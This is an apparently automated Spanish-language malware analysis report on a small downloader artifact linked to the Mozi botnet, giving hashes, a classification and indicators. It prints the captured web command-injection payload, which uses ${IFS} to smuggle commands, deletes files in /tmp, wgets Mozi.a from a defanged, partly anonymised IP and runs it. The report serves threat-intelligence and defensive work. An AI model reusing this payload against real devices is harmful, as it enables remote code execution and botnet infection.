# 🧬 Payload Analysis

`0d87c236d835dfba4ca01a6f7d2df01b23bcbb9bff51d7f5ff03d1f739788e09`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 159 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.a` en `hxxp://110.37.80.XXX:47114/Mozi.a`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:03.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `0d87c236d835dfba4ca01a6f7d2df01b23bcbb9bff51d7f5ff03d1f739788e09`
- **MD5:** `9b5d28e15b1e9b2cd119b084916b13c0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 159 B |
| Entropía | 5.27 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://110.37.80.XXX:47114/Mozi.a;sh${IFS}/tmp/Mozi
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://110.37.80.XXX:47114/Mozi.a;sh$ | strings |
| ip | 110.37.80.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://110.37.80.XXX:47114/Mozi.a;sh${IFS}/tmp/Mozi | strings |
| hash | 0d87c236d835dfba4ca01a6f7d2df01b23bcbb9bff51d7f5ff03d1f739788e09 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
